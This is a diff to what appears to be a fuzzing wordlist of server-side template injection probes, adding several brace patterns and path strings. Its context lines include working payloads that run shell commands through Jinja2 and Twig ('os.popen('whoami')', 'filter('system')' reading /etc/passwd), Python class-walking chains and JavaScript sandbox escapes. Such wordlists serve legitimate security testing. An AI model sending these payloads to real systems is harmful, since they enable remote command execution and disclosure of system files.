@@ -100,6 +100,8 @@ ${{<%[%'"}}%\
 - "#{name.last_name}-#{name.last_name}"
 - "#{prefix} #{first_name} #{last_name}"
 -@{.vtjjzkjvm0dgx#pa{r
+/ libs / opensocial / makerequest {0}? url = {{0}}
+/ libs / opensocial / proxy {0}? container = default & url = {{0}}
 /*/%7b%7burl%20absolute=
 /.putty/{{hostname}}.ppk
 /.ssh/{{hostname}}.ppk
@@ -317,6 +319,8 @@ ${{<%[%'"}}%\
 @{[system "touch /tmp/blns.fail"]}
 @{c:\windows\winstore\resources.pri?ms-resource://winstore/resources/displayname}
 @{{7*7}}
+@{{{{{{{
+@{{{{{{{{{{{
 a=`${alert/*}`;
 application-${clazz.classname}.xml.ftl
 application-${clazz.classname}.xml.ftl.svn-base
@@ -459,6 +463,7 @@ plugins/struts2/template/web/${namespace}/${classname}/edit.jsp
 plugins/struts2/template/web/${namespace}/${classname}/form_include.jsp
 plugins/struts2/template/web/${namespace}/${classname}/list.jsp
 plugins/struts2/template/web/${namespace}/${classname}/show.jsp
+products/{{item.link}}
 prompt`${document.domain}`
 q@{{tk5}}0p
 search?search_key={{1337*1338}}
@@ -507,6 +512,7 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
 {% import "os" %}{{ os.popen("whoami").read() }}
 {@pnv@{veq#nn_%t(gopb2]-caskjp{jxh!nvodz.{j9h2a$n0
+{@{{{{{{
 {{ ''.__class__.__mro__ }}
 {{ ''.__class__.__mro__[2].__subclasses__() }}
 {{ '7'*7 }}
@@ -523,6 +529,11 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {{ oidc_playground_jwt_secret }}
 {{ request }}
 {{ self.template.module.os.popen('whoami').read() }}
+{{ theme sanitized }}.behaviors.js
+{{ theme sanitized }}.hacks.scss
+{{ theme sanitized }}.no-query.scss
+{{ theme sanitized }}.normalize.scss
+{{ theme sanitized }}.styles.scss
 {{# 7*7 }}
 {{$eval.constructor('alert(1)')()}}
 {{$i}}: {{$frame.function}}
@@ -544,6 +555,7 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {{= tnn96}}
 {{=42*42}}
 {{=machine}}.conf
+{{@{{{{{
 {{['cat$ifs/etc/passwd']|filter('system')}}
 {{['cat\x20/etc/passwd']|filter('system')}}
 {{['id']|filter('system')}}
@@ -621,5 +633,8 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {{url}}
 {{{42*42}}}
 {{{7*7}}}
+{{{{@{{{
+{{{{@{{{{{{{
+{{{{{@{{{{{{
 {{{}.tostring.constructor('confirm(1)')()}}
 }aj;5a&hl@{z
